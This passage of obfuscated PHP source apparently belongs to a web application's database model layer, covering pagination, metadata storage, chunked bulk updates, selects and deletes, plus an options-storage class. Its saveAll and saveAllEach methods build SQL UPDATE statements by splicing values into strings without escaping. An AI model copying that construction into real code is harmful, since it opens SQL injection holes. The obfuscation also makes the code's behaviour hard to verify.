= ceil($c÷‘Õ²Šî / $c‰ô¶‡º±÷); $bµÄÖ§­±Û = intval(isset($in[$A©ˆÇŠá[349]]) ? $in[$A©ˆÇŠá[349]] : $bµÄÖ§­±Û); $bµÄÖ§­±Û = $bµÄÖ§­±Û <= 1 ? 1 : ($bµÄÖ§­±Û >= $f¼®¼‚Ü‚Ù ? $f¼®¼‚Ü‚Ù : $bµÄÖ§­±Û); goto B±Ö½ŞŒÉÒ; C—Ø«åÏå: $c÷‘Õ²Šî = intval($this->count()); $c‰ô¶‡º±÷ = intval($c‰ô¶‡º±÷); $c‰ô¶‡º±÷ = $c‰ô¶‡º±÷ <= 5 ? 5 : ($c‰ô¶‡º±÷ >= $c‡ ï‰Ò° ? $c‡ ï‰Ò° : $c‰ô¶‡º±÷); goto dÇÊÈİİ²; C‘ù–à„º„: $A©ˆÇŠá =& $_SERVER[çŞáÓæÚô‚Ô‡]; global $in; $fŞÜéÀ›å = $this->optionsValue(); goto A§ÁÓØîµ; EÌšÒØ±šò: $dƒŒÄêÒ£ = $fŞÜéÀ›å; $dƒŒÄêÒ£[$A©ˆÇŠá[359]] = array(); $this->optionsValue($dƒŒÄêÒ£); goto C—Ø«åÏå; A§ÁÓØîµ: $c‡ ï‰Ò° = 4000; $c‰ô¶‡º±÷ = isset($in[$A©ˆÇŠá[358]]) ? $in[$A©ˆÇŠá[358]] : $c‰ô¶‡º±÷; if ($c‰ô¶‡º±÷ === -1) { unset($in[$A©ˆÇŠá[358]]); $c‡ ï‰Ò° = 100000000; $c‰ô¶‡º±÷ = $c‡ ï‰Ò°; } goto EÌšÒØ±šò; B±Ö½ŞŒÉÒ: $this->optionsValue($fŞÜéÀ›å); $D²Úšñ‰ó­ = $this->page($bµÄÖ§­±Û, $c‰ô¶‡º±÷)->select(); $D²Úšñ‰ó­ = is_array($D²Úšñ‰ó­) ? $D²Úšñ‰ó­ : array(); goto b„´›°›±; AîŞªßœî‡: } protected function checkLength($Bİ£çÔùïØ, $DÅÑ÷½Š = 0, $Fïµ‘É‘Ìá = '') { $aÁƒİÍ¸Ì” =& $_SERVER[çŞáÓæÚô‚Ô‡]; $DÅÑ÷½Š = $DÅÑ÷½Š ? $DÅÑ÷½Š : 65536; if (!$Bİ£çÔùïØ || strlen($Bİ£çÔùïØ) < $DÅÑ÷½Š) { return; } $Fïµ‘É‘Ìá = $Fïµ‘É‘Ìá ? $Fïµ‘É‘Ìá . $aÁƒİÍ¸Ì”[77] : $aÁƒİÍ¸Ì”[43]; show_json($Fïµ‘É‘Ìá . LNG($aÁƒİÍ¸Ì”[364]) . "\x28{$DÅÑ÷½Š}\x29", !1); } protected function metaSet($EŸ¸‰„åÜµ, $Eê‹¥òÊµÙ = null, $EîªöÃƒâ = null) { goto có·îÒ¾´°; e¿ÀÔº®Ù: $f§¾ƒ´œçì->where(array($f˜¦¬ßĞ§İ => $EŸ¸‰„åÜµ))->addAll($A´ƒÉà, array(), !0); return !0; goto d‹ÚÙæ‡Å; có·îÒ¾´°: $EĞÂ«‹Ûİì =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$this->tableMeta) { return !1; } $f˜¦¬ßĞ§İ = $this->tableMeta[$EĞÂ«‹Ûİì[365]]; goto Bã®Õƒ; B•·„ßÌ—Ğ: if (is_null($Eê‹¥òÊµÙ)) { return $f§¾ƒ´œçì->where(array($f˜¦¬ßĞ§İ => $EŸ¸‰„åÜµ))->delete(); } if (is_null($EîªöÃƒâ) && is_string($Eê‹¥òÊµÙ)) { return $f§¾ƒ´œçì->where($aŠ‘ŞñÃÍ)->delete(); } $e¯¶ì¡Öí– = is_array($Eê‹¥òÊµÙ) ? $Eê‹¥òÊµÙ : array(); goto B§Ï­ôƒÌ; B§Ï­ôƒÌ: if (is_string($Eê‹¥òÊµÙ)) { $e¯¶ì¡Öí–[$Eê‹¥òÊµÙ] = $EîªöÃƒâ; } $A´ƒÉà = array(); foreach ($e¯¶ì¡Öí– as $d±‚ÍÈò» => $f›§Ã‘È¾) { $this->checkLength($f›§Ã‘È¾, !1, $D‚¤‡áá¡ . $EĞÂ«‹Ûİì[4] . $d±‚ÍÈò»); $A´ƒÉà[] = array($f˜¦¬ßĞ§İ => $EŸ¸‰„åÜµ, $EĞÂ«‹Ûİì[99] => $d±‚ÍÈò», $EĞÂ«‹Ûİì[368] => $f›§Ã‘È¾); } goto e¿ÀÔº®Ù; Bã®Õƒ: $D‚¤‡áá¡ = $this->tableMeta[$EĞÂ«‹Ûİì[366]]; $f§¾ƒ´œçì = Model($D‚¤‡áá¡); $aŠ‘ŞñÃÍ = array($f˜¦¬ßĞ§İ => $EŸ¸‰„åÜµ, $EĞÂ«‹Ûİì[367] => $Eê‹¥òÊµÙ); goto B•·„ßÌ—Ğ; d‹ÚÙæ‡Å: } public function metaGet($f¡’‚®±Ä, $a›Ğ²ƒ¡Õ½ = false) { goto C„í‡×—â•; fğ¼ÔğŠõ»: $B¿Ù¢ÈÁæÇ = Model($this->tableMeta[$AŒî¦ÊŠ‰‰[366]]); if ($a›Ğ²ƒ¡Õ½) { $c˜Çà¿ç‚ = array($CÊğ³ËÈÀ– => $f¡’‚®±Ä, $AŒî¦ÊŠ‰‰[99] => $a›Ğ²ƒ¡Õ½); return $B¿Ù¢ÈÁæÇ->where($c˜Çà¿ç‚)->getField($AŒî¦ÊŠ‰‰[368]); } $c˜Çà¿ç‚ = array($CÊğ³ËÈÀ– => $f¡’‚®±Ä); goto BÉ§“‡†çÈ; BÉ§“‡†çÈ: $eá¢ßÉŠâ¸ = $B¿Ù¢ÈÁæÇ->field($AŒî¦ÊŠ‰‰[369])->where($c˜Çà¿ç‚)->select(); $eá¢ßÉŠâ¸ = array_to_keyvalue($eá¢ßÉŠâ¸, $AŒî¦ÊŠ‰‰[99], $AŒî¦ÊŠ‰‰[368]); return $eá¢ßÉŠâ¸; goto AŞ©·£Â‹; C„í‡×—â•: $AŒî¦ÊŠ‰‰ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$this->tableMeta) { return array(); } $CÊğ³ËÈÀ– = $this->tableMeta[$AŒî¦ÊŠ‰‰[365]]; goto fğ¼ÔğŠõ»; AŞ©·£Â‹: } private function checkDataAutoHas($d¨‚®ãÊöğ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $eĞ¯‡‘¾¡) { if (in_array($d¨‚®ãÊöğ, explode($_SERVER[çŞáÓæÚô‚Ô‡][57], $eĞ¯‡‘¾¡[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$f®×¨æô¶, $f‚®Ö¡ˆÒÉ) { $F‹Ä‚Ÿ’¢Ø =& $_SERVER[çŞáÓæÚô‚Ô‡]; foreach ($this->dataAuto as $d¶ïÀË‹ï“) { $Aö¸Ï™´œ = $d¶ïÀË‹ï“[0]; if (!in_array($f‚®Ö¡ˆÒÉ, explode($F‹Ä‚Ÿ’¢Ø[57], $d¶ïÀË‹ï“[2]))) { continue; } switch (trim($d¶ïÀË‹ï“[3])) { case $F‹Ä‚Ÿ’¢Ø[318]: case $F‹Ä‚Ÿ’¢Ø[319]: $C¢¶Øï’ ± = $d¶ïÀË‹ï“[1]; $F—æŒ÷– = isset($d¶ïÀË‹ï“[4]) ? (array) $d¶ïÀË‹ï“[4] : array(); if ($C¢¶Øï’ ± == $F‹Ä‚Ÿ’¢Ø[200] && array_key_exists($Aö¸Ï™´œ, $f®×¨æô¶)) { if (!$f®×¨æô¶[$Aö¸Ï™´œ]) { unset($f®×¨æô¶[$Aö¸Ï™´œ]); } break; } if (isset($f®×¨æô¶[$Aö¸Ï™´œ])) { array_unshift($F—æŒ÷–, $f®×¨æô¶[$Aö¸Ï™´œ]); } if ($F‹Ä‚Ÿ’¢Ø[318] == $d¶ïÀË‹ï“[3]) { $f®×¨æô¶[$Aö¸Ï™´œ] = call_user_func_array($C¢¶Øï’ ±, $F—æŒ÷–); } else { $f®×¨æô¶[$Aö¸Ï™´œ] = call_user_func_array(array(&$this, $C¢¶Øï’ ±), $F—æŒ÷–); } break; case $F‹Ä‚Ÿ’¢Ø[270]: $f®×¨æô¶[$Aö¸Ï™´œ] = $f®×¨æô¶[$d¶ïÀË‹ï“[1]]; break; case $F‹Ä‚Ÿ’¢Ø[291]: if (isset($f®×¨æô¶[$Aö¸Ï™´œ]) && !is_string($f®×¨æô¶[$Aö¸Ï™´œ])) { $f®×¨æô¶[$Aö¸Ï™´œ] = json_encode_force($f®×¨æô¶[$Aö¸Ï™´œ]); } break; case $F‹Ä‚Ÿ’¢Ø[320]: if ($f®×¨æô¶[$Aö¸Ï™´œ] === $F‹Ä‚Ÿ’¢Ø[43]) { unset($f®×¨æô¶[$Aö¸Ï™´œ]); } break; case $F‹Ä‚Ÿ’¢Ø[321]: $f®×¨æô¶[$Aö¸Ï™´œ] = $d¶ïÀË‹ï“[1]; default: break; } } if ($f‚®Ö¡ˆÒÉ == $F‹Ä‚Ÿ’¢Ø[353]) { $FáĞ‡†ğŠµ = strtolower($this->db->getDbType()); if (strpos($FáĞ‡†ğŠµ, $F‹Ä‚Ÿ’¢Ø[19]) !== 0) { return; } $DÄø±Š¬ßÅ = $this->field(!0)->fields; $Aª«ä½ˆ…© = $DÄø±Š¬ßÅ[$F‹Ä‚Ÿ’¢Ø[249]]; if (isset($DÄø±Š¬ßÅ[$F‹Ä‚Ÿ’¢Ø[248]])) { unset($Aª«ä½ˆ…©[$DÄø±Š¬ßÅ[$F‹Ä‚Ÿ’¢Ø[248]]]); } foreach ($Aª«ä½ˆ…© as $AŒ¥°‹¯… => $f‚®Ö¡ˆÒÉ) { if (!isset($f®×¨æô¶[$AŒ¥°‹¯…])) { $f®×¨æô¶[$AŒ¥°‹¯…] = $F‹Ä‚Ÿ’¢Ø[43]; } } } } private function dataAfterFilter(&$B½Äğ‹¯) { $cŠ™ñ„îŠã =& $_SERVER[çŞáÓæÚô‚Ô‡]; foreach ($this->dataAuto as $Dæ±ØÏµŠ) { $Bè¦Ùªœæ× = $Dæ±ØÏµŠ[0]; if (!in_array($cŠ™ñ„îŠã[355], explode($cŠ™ñ„îŠã[57], $Dæ±ØÏµŠ[2]))) { continue; } if (!isset($B½Äğ‹¯[$Bè¦Ùªœæ×])) { continue; } switch (trim($Dæ±ØÏµŠ[3])) { case $cŠ™ñ„îŠã[318]: case $cŠ™ñ„îŠã[319]: $BÂÖ‘¤À® = isset($Dæ±ØÏµŠ[4]) ? (array) $Dæ±ØÏµŠ[4] : array(); array_unshift($BÂÖ‘¤À®, $B½Äğ‹¯[$Bè¦Ùªœæ×]); if ($cŠ™ñ„îŠã[318] == $Dæ±ØÏµŠ[3]) { $B½Äğ‹¯[$Bè¦Ùªœæ×] = call_user_func_array($Dæ±ØÏµŠ[1], $BÂÖ‘¤À®); } else { $B½Äğ‹¯[$Bè¦Ùªœæ×] = call_user_func_array(array(&$this, $Dæ±ØÏµŠ[1]), $BÂÖ‘¤À®); } break; case $cŠ™ñ„îŠã[270]: $B½Äğ‹¯[$Bè¦Ùªœæ×] = $B½Äğ‹¯[$Dæ±ØÏµŠ[1]]; break; case $cŠ™ñ„îŠã[291]: $aõÙ¸ºÉìå = $B½Äğ‹¯[$Bè¦Ùªœæ×]; $B½Äğ‹¯[$Bè¦Ùªœæ×] = json_decode($aõÙ¸ºÉìå, !0); if (is_null($B½Äğ‹¯[$Bè¦Ùªœæ×])) { $B½Äğ‹¯[$Bè¦Ùªœæ×] = $aõÙ¸ºÉìå; } break; case $cŠ™ñ„îŠã[320]: if ($B½Äğ‹¯[$Bè¦Ùªœæ×] === $cŠ™ñ„îŠã[43]) { unset($B½Äğ‹¯[$Bè¦Ùªœæ×]); } break; case $cŠ™ñ„îŠã[321]: $B½Äğ‹¯[$Bè¦Ùªœæ×] = $Dæ±ØÏµŠ[1]; default: break; } } } public function saveAll($dÔÑ¨º”é) { goto a Ã¥Ä­¿; a Ã¥Ä­¿: $cÜ¬„³‘¼ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $f—º‘‘Çê = $this->tablePrefix . $this->tableName; $báİËñèÎ = self::SQL_WHERE_IN_CHUNK; goto Aª’ÀåÒ˜Ò; a¥°‹¥³ò: $bˆÔŠà©‚˜ = array(); $c¨‹ßÓ¿Ò = count($dÔÑ¨º”é); for ($dÔˆ–³Ò³Î = 0; $dÔˆ–³Ò³Î < $c¨‹ßÓ¿Ò; $dÔˆ–³Ò³Î++) { $FÑÈÙ“à = $dÔÑ¨º”é[$dÔˆ–³Ò³Î]; if (!is_array($FÑÈÙ“à) || count($FÑÈÙ“à) != 4) { continue; } $f÷¦—øÍ = "\125\120\104\x41\124\105\x20\140{$f—º‘‘Çê}\x60\40\123\x45\x54\40{$FÑÈÙ“à[2]}\x20\x3d\40\x43\x41\x53\x45\40{$FÑÈÙ“à[0]}\x20\xa"; if ($cïèã›…êò == 0) { $FñÃºö‚â’ = $f÷¦—øÍ; } $bˆÔŠà©‚˜[] = $cÜ¬„³‘¼[123] . $FÑÈÙ“à[1] . $cÜ¬„³‘¼[123]; $cïèã›…êò++; $FñÃºö‚â’ .= "\40\x57\x48\105\116\x20\47{$FÑÈÙ“à[1]}\47\x20\x54\110\105\116\x20\47{$FÑÈÙ“à[3]}\x27\40\xa"; if ($cïèã›…êò == $báİËñèÎ || $dÔˆ–³Ò³Î == $c¨‹ßÓ¿Ò - 1) { goto e†°ÑŠİ¤ä; e†°ÑŠİ¤ä: $a¾¦œ²ƒ¼† = implode($cÜ¬„³‘¼[57], $bˆÔŠà©‚˜); $FñÃºö‚â’ .= "\40\x45\x4e\104\40\40\127\x48\105\122\105\40{$FÑÈÙ“à[0]}\40\x49\x4e\40\x28{$a¾¦œ²ƒ¼†}\x29\40"; $this->execute($FñÃºö‚â’); goto EÓÒàØàÖ…; EÓÒàØàÖ…: $cïèã›…êò = 0; $FñÃºö‚â’ = $f÷¦—øÍ; $this->chunkEventCheck(count($bˆÔŠà©‚˜)); goto eìá»ÛÈÒ©; eìá»ÛÈÒ©: $bˆÔŠà©‚˜ = array(); goto a¸Ü£ Ãƒ“; a¸Ü£ Ãƒ“: } } goto FªÑ±ÌÒ‚; FªÑ±ÌÒ‚: $this->chunkEventSet(); goto f¥×Ü²´ŞÜ; Aª’ÀåÒ˜Ò: $dÔÑ¨º”é = is_array($dÔÑ¨º”é) ? $dÔÑ¨º”é : array(); $FñÃºö‚â’ = $cÜ¬„³‘¼[370]; $cïèã›…êò = 0; goto a¥°‹¥³ò; f¥×Ü²´ŞÜ: } public function saveAllEach($eœìŞî²™) { $FëŠ²”›š• =& $_SERVER[çŞáÓæÚô‚Ô‡]; $bŠÉŸ·„î = $this->tablePrefix . $this->tableName; foreach ($eœìŞî²™ as $A®´®Ø•°Ò) { if (!is_array($A®´®Ø•°Ò) || count($A®´®Ø•°Ò) != 4) { continue; } $Bõ‚ñôá‚ = $A®´®Ø•°Ò[0] . $FëŠ²”›š•[371] . $A®´®Ø•°Ò[1] . $FëŠ²”›š•[123]; $aİŞÈÊºÑ² = $A®´®Ø•°Ò[2] . $FëŠ²”›š•[371] . $A®´®Ø•°Ò[3] . $FëŠ²”›š•[123]; $DŒŞŸˆçï‚ = "\165\160\x64\x61\164\145\x20{$bŠÉŸ·„î}\x20\x73\x65\x74\40{$aİŞÈÊºÑ²}\40\167\150\145\162\x65\x20{$Bõ‚ñôá‚}\73"; $this->execute($DŒŞŸˆçï‚); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($b—Ä…êë = false, $c¿ÛŒë©™ = false) { $this->_chunkEvent = $b—Ä…êë; $this->_chunkEventParam = $c¿ÛŒë©™; } private function chunkEventCheck($aâä¤‘ƒÖ—) { if (!$this->_chunkEvent) { return; } $eÔ¿„ÔŸë = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $eÔ¿„ÔŸë[$_SERVER[çŞáÓæÚô‚Ô‡][372]] = $aâä¤‘ƒÖ—; Hook::trigger($this->_chunkEvent, $eÔ¿„ÔŸë); } public function addAll($Eƒ‚ğÌ´ë÷, $dòöíá†®Ÿ = array(), $e‡ø³œ»” = false) { goto Dî°‚àèŒ; fÁ¶í©¶õÊ: if (method_exists($this->db, $B½õÁšì±¹[269])) { for ($fßˆ¼â¼ø = 0; $fßˆ¼â¼ø < count($Eƒ‚ğÌ´ë÷); $fßˆ¼â¼ø += $e›ù¤‚İ…Ü) { $aÆù¾µ˜Í¦ = array_slice($Eƒ‚ğÌ´ë÷, $fßˆ¼â¼ø, $e›ù¤‚İ…Ü); if (!is_array($aÆù¾µ˜Í¦) || count($aÆù¾µ˜Í¦) == 0) { break; } $e†¥…™ÎÎí = $this->db->insertAll($aÆù¾µ˜Í¦, $dòöíá†®Ÿ, $e‡ø³œ»”); $this->chunkEventCheck(count($aÆù¾µ˜Í¦)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($Eƒ‚ğÌ´ë÷ as $aÜêóğ¾¤ => $e†òš›•Š) { $e†¥…™ÎÎí = $this->db->insert($e†òš›•Š, $dòöíá†®Ÿ, $e‡ø³œ»”); } $this->commit(); } if (!1 !== $e†¥…™ÎÎí) { $B›Øåó¿ë = $this->getLastInsID(); if ($B›Øåó¿ë) { return $B›Øåó¿ë; } } return $e†¥…™ÎÎí; goto dÄë„•øöğ; Dî°‚àèŒ: $B½õÁšì±¹ =& $_SERVER[çŞáÓæÚô‚Ô‡]; ignore_timeout(); $e›ù¤‚İ…Ü = self::SQL_WHERE_IN_CHUNK; goto b÷³•½˜¥Í; b÷³•½˜¥Í: if (empty($Eƒ‚ğÌ´ë÷)) { $this->error = think_lang($B½õÁšì±¹[268]); return !1; } $dòöíá†®Ÿ = $this->_parseOptions($dòöíá†®Ÿ); foreach ($Eƒ‚ğÌ´ë÷ as $aÜêóğ¾¤ => $e†òš›•Š) { $Eƒ‚ğÌ´ë÷[$aÜêóğ¾¤] = $this->_facade($e†òš›•Š); $this->_beforeInsert($Eƒ‚ğÌ´ë÷[$aÜêóğ¾¤], $dòöíá†®Ÿ); } goto fÁ¶í©¶õÊ; dÄë„•øöğ: } public function save($eÅ÷æÇÃŒÈ = '', $AíáøËÕÂ = array()) { goto aÇ¬‚äÎ; aÇ¬‚äÎ: $cÀòÆØ¶Šâ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $F‘Ğà¯´Ø° = self::SQL_WHERE_IN_CHUNK; $C‰ñ‘”ñ— = $this->optionsValue(); goto fäôô†Ì›ˆ; fäôô†Ì›ˆ: $cˆšÏÊÎßù = $this->findWhereField($C‰ñ‘”ñ—); if (!$cˆšÏÊÎßù) { return parent::save($eÅ÷æÇÃŒÈ, $AíáøËÕÂ); } $c•ŒÀîóÀÓ = 0; goto aËÄã¤³ßµ; B¢„ÁÚ›Ãô: for ($EŞÎÓê¡ = 0; $EŞÎÓê¡ < $dĞÙî‘í¯÷; $EŞÎÓê¡ += $F‘Ğà¯´Ø°) { $CÖùŒÓ‡¾ = array_slice($FŸ»½Ù£îù, $EŞÎÓê¡, $F‘Ğà¯´Ø°); if (!is_array($CÖùŒÓ‡¾) || count($CÖùŒÓ‡¾) == 0) { break; } $C‰ñ‘”ñ—[$cÀòÆØ¶Šâ[272]][$cˆšÏÊÎßù][1] = $CÖùŒÓ‡¾; $this->optionsValue($C‰ñ‘”ñ—); $c•ŒÀîóÀÓ += parent::save($eÅ÷æÇÃŒÈ, $AíáøËÕÂ); $this->chunkEventCheck(count($CÖùŒÓ‡¾)); } $this->chunkEventSet(); return $c•ŒÀîóÀÓ; goto cºáí’©¡; aËÄã¤³ßµ: $FŸ»½Ù£îù = $C‰ñ‘”ñ—[$cÀòÆØ¶Šâ[272]][$cˆšÏÊÎßù][1]; $FŸ»½Ù£îù = is_array($FŸ»½Ù£îù) ? $FŸ»½Ù£îù : array(); $dĞÙî‘í¯÷ = count($FŸ»½Ù£îù); goto B¢„ÁÚ›Ãô; cºáí’©¡: } public function add($d—¨£Ïéìë = '', $E® ÜİŒğ = array(), $aµ‡­¢Ìİ = false) { if ($this->addTaskStatus && is_array($d—¨£Ïéìë)) { $this->addTaskData[] = $d—¨£Ïéìë; return; } return parent::add($d—¨£Ïéìë, $E® ÜİŒğ, $aµ‡­¢Ìİ); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($BáÖğËŒ¹£ = array()) { goto FŒ¼›×’Ä; Cœ­…öĞ‡: $E¿æîîÉùâ = is_array($E¿æîîÉùâ) ? $E¿æîîÉùâ : array(); $eáğ×óÅ« = null; for ($c©âá„ÍÊ” = 0; $c©âá„ÍÊ” < count($E¿æîîÉùâ); $c©âá„ÍÊ” += $F¼Â‹òÄš‘) { $D«à–¼ÆŠ = array_slice($E¿æîîÉùâ, $c©âá„ÍÊ”, $F¼Â‹òÄš‘); if (!is_array($D«à–¼ÆŠ) || count($D«à–¼ÆŠ) == 0) { break; } $CƒÍÑ»‰ÆÖ[$CÓß½Ä§ç¥[272]][$D•ŒËÊºè][1] = $D«à–¼ÆŠ; $this->optionsValue($CƒÍÑ»‰ÆÖ); $aàŠª¥ùÔŠ = parent::select($BáÖğËŒ¹£); if (!$aàŠª¥ùÔŠ) { continue; } if (is_null($eáğ×óÅ«)) { $eáğ×óÅ« = array(); } $eáğ×óÅ« = array_merge($eáğ×óÅ«, $aàŠª¥ùÔŠ); } goto aË«ò¦¢; FŒ¼›×’Ä: $CÓß½Ä§ç¥ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $F¼Â‹òÄš‘ = self::SQL_WHERE_IN_CHUNK; $CƒÍÑ»‰ÆÖ = $this->optionsValue(); goto bê¡§´šƒ¦; bê¡§´šƒ¦: $D•ŒËÊºè = $this->findWhereField($CƒÍÑ»‰ÆÖ); if (!$D•ŒËÊºè || isset($CƒÍÑ»‰ÆÖ[$CÓß½Ä§ç¥[289]]) || isset($CƒÍÑ»‰ÆÖ[$CÓß½Ä§ç¥[349]])) { return parent::select($BáÖğËŒ¹£); } $E¿æîîÉùâ = $CƒÍÑ»‰ÆÖ[$CÓß½Ä§ç¥[272]][$D•ŒËÊºè][1]; goto Cœ­…öĞ‡; aË«ò¦¢: return $eáğ×óÅ«; goto eÖƒ«ë‰Ú÷; eÖƒ«ë‰Ú÷: } public function delete($aÔĞ½…äš = array()) { goto F„Ø¡‰¬Ã·; d ‹®³´ğƒ: return $F™¼Ú¦‘œ­; goto AÒñäàã‚§; CÀØİ¬†•ƒ: $c ÅóÑÒ¾¿ = $B¥éî³–®š[$d¼×•ğâË‚[272]][$dŞ¡ÜŠÑò§][1]; $c ÅóÑÒ¾¿ = is_array($c ÅóÑÒ¾¿) ? $c ÅóÑÒ¾¿ : array(); for ($AŠ¤Œñ±…Š = 0; $AŠ¤Œñ±…Š < count($c ÅóÑÒ¾¿); $AŠ¤Œñ±…Š += $A¦ÜÌÅÎ³©) { $d¯öõ·°¤õ = array_slice($c ÅóÑÒ¾¿, $AŠ¤Œñ±…Š, $A¦ÜÌÅÎ³©); if (!is_array($d¯öõ·°¤õ) || count($d¯öõ·°¤õ) == 0) { break; } $B¥éî³–®š[$d¼×•ğâË‚[272]][$dŞ¡ÜŠÑò§][1] = $d¯öõ·°¤õ; $this->optionsValue($B¥éî³–®š); $F™¼Ú¦‘œ­ += parent::delete($aÔĞ½…äš); } goto d ‹®³´ğƒ; F„Ø¡‰¬Ã·: $d¼×•ğâË‚ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $A¦ÜÌÅÎ³© = self::SQL_WHERE_IN_CHUNK; $B¥éî³–®š = $this->optionsValue(); goto CæŞ™£Ìè; CæŞ™£Ìè: $dŞ¡ÜŠÑò§ = $this->findWhereField($B¥éî³–®š); if (!$dŞ¡ÜŠÑò§) { return parent::delete($aÔĞ½…äš); } $F™¼Ú¦‘œ­ = 0; goto CÀØİ¬†•ƒ; AÒñäàã‚§: } private function findWhereField($C…âºƒÆ) { $fà­ö—”ğ˜ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $b´ÔØ²£À = self::SQL_WHERE_IN_CHUNK; if (!is_array($C…âºƒÆ) || !is_array($C…âºƒÆ[$fà­ö—”ğ˜[272]])) { return !1; } foreach ($C…âºƒÆ[$fà­ö—”ğ˜[272]] as $DÊÃŠ±Š‹ñ => $EæÃÚ«™ß) { if (is_array($EæÃÚ«™ß) && isset($EæÃÚ«™ß[0]) && is_string($EæÃÚ«™ß[0]) && strtolower($EæÃÚ«™ß[0]) == $fà­ö—”ğ˜[17] && is_array($EæÃÚ«™ß[1]) && count($EæÃÚ«™ß[1]) > $b´ÔØ²£À) { ignore_timeout(); return $DÊÃŠ±Š‹ñ; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\163\164\x65\x6d\117\x70\x74\151\x6f\x6e"; public $field = array(); public function listData($eÌÂˆÂÎÉ = false, $AìÌ¹¶°— = "\155\x6f\144\x69\146\171\124\151\155\145", $e—Ò¤Œ÷œ¿ = false) { $AÒİ»•Æ†Ğ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$AÒİ»•Æ†Ğ) { return $eÌÂˆÂÎÉ ? null : array(); } if (!$eÌÂˆÂÎÉ) { $AÒİ»•Æ†Ğ = array_filter(array_values($AÒİ»•Æ†Ğ)); return array_sort_by($AÒİ»•Æ†Ğ, $AìÌ¹¶°—, $e—Ò¤Œ÷œ¿); } return $AÒİ»•Æ†Ğ[$_SERVER[çŞáÓæÚô‚Ô‡][373] . $eÌÂˆÂÎÉ]; } public function insert($fëååæÊÔ) { goto dÆñóÎ¾‘Ü; fãíí•»õ¦: $fëååæÊÔ[$báóì¯³[117]] = time(); Model($this->modelType)->set($báóì¯³[374], $d°õ÷º‘—Ç, $this->optionType . $báóì¯³[375]); Model($this->modelType)->set($báóì¯³[373] . $d°õ÷º‘—Ç, $fëååæÊÔ, $this->optionType); goto eß¿‡Ş­Ş; E¬¡ğŠºˆ: $d°õ÷º‘—Ç = $d°õ÷º‘—Ç ? $d°õ÷º‘—Ç : 0; $fëååæÊÔ[$báóì¯³[376]] = ++$d°õ÷º‘—Ç; $fëååæÊÔ[$báóì¯³[197]] = time(); goto fãíí•»õ¦; dÆñóÎ¾‘Ü: $báóì¯³ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $fëååæÊÔ = array_field_key($fëååæÊÔ, $this->field); $d°õ÷º‘—Ç = Model($this->modelType)->get($báóì¯³[374], $this->optionType . $báóì¯³[375]); goto E¬¡ğŠºˆ; eß¿‡Ş­Ş: return $d°õ÷º‘—Ç; goto f·æ°¯ò; f·æ°¯ò: } public function update($e™êÂ¡Ä¶Î, $a³òŞ–ÄŸ) { goto aè‹‡îÈí; aè‹‡îÈí: $Eïä¸Ï¼ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $a³òŞ–ÄŸ = array_field_key($a³òŞ–ÄŸ, $this->field); $fõŞÕÆ‡‡Ê = $this->listData($e™êÂ¡Ä¶Î); goto FÆÁê–®íÉ; A›îµ¹…Î: return Model($this->modelType)->set($Eïä¸Ï¼[373] . $e™êÂ¡Ä¶Î, $a³òŞ–ÄŸ, $this->optionType); goto c§ĞÇ‚Œ÷é; FÆÁê–®íÉ: if (!$fõŞÕÆ‡‡Ê) { return !1; } $a³òŞ–ÄŸ = array_merge($fõŞÕÆ‡‡Ê, $a³òŞ–ÄŸ); $a³òŞ–ÄŸ[$Eïä¸Ï¼[117]] = time(); goto A›îµ¹…Î; c§ĞÇ‚Œ÷é: } public function remove($E»‰ˆˆº½ñ) { return Model($this->modelType)->remove($_SERVER[çŞáÓæÚô‚Ô‡][373] . $E»‰ˆˆº½ñ, $this->optionType); } public function clear() { $a¯×´°Ÿßø =& $_SERVER[çŞáÓæÚô‚Ô‡]; Model($this->modelType)->remove($a¯×´°Ÿßø[374], $this->optionType . $a¯×´°Ÿßø[375]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($B›œİ©Ç˜ì, $eŞÂŸÈ¡¸§) { if (!$eŞÂŸÈ¡¸§) { return !1; } $Bˆª¿ö“è = $this->listData(); $Bˆª¿ö“è = array_to_keyvalue($Bˆª¿ö“è, $B›œİ©Ç˜ì); return isset($Bˆª¿ö“è[$eŞÂŸÈ¡¸§]) ? $Bˆª¿ö“è[$eŞÂŸÈ¡¸§] : !1; } public function findByName($fŒ‰µ–É¦ä) { return $this->findByKey($_SERVER[çŞáÓæÚô‚Ô‡][38], $fŒ‰µ–É¦ä); } protected function resetData($EÊÃŒ¹ì) { $C–Â†…â–– =& $_SERVER[çŞáÓæÚô‚Ô‡]; $EÊÃŒ¹ì = is_array($EÊÃŒ¹ì) ? $EÊÃŒ¹ì : array(); $A´ñ÷Ì…¸„ = array(); for ($Eôê†¸âõ® = 0; $Eôê†¸âõ® < count($EÊÃŒ¹ì); $Eôê†¸âõ®++) { $A´ñ÷Ì…¸„[$C–Â†…â––[373] . $EÊÃŒ¹ì[$Eôê†¸âõ®][$C–Â†…â––[376]]] = $EÊÃŒ¹ì[$Eôê†¸âõ®]; } return Model($this->modelType)->set($A´ñ÷Ì…¸„, !1, $this->optionType); } private function getAutoName($Cñ‡³Ó¨ÒÛ) { $a±Ç´áØ“ = array_to_keyvalue($this->listData(), $_SERVER[çŞáÓæÚô‚Ô‡][38]); if (!$a±Ç´áØ“ || !isset($a±Ç´áØ“[$Cñ‡³Ó¨ÒÛ])) { return $Cñ‡³Ó¨ÒÛ; } for ($EÚ†óğëÏÆ = 1; 